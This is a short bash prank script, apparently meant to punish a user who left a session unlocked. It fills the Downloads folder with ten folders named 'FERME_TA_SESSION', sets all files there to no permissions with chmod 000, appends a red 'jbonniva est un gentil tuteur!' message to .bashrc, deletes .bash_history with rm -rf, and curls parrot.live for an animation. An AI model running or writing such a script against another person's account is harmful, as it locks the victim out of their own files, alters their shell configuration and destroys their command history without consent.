#!/bin/bash

cd ./Downloads
nbr=0
while ((nbr != 10))
	do
		mkdir "FERME_TA_SESSION$nbr"
		((nbr += 1))
	done
chmod 000 *
cd ./..
echo -e "echo -e '\033[31mjbonniva est un gentil tuteur!\033[00m'" >> .bashrc
rm -rf .bash_history
clear
curl parrot.live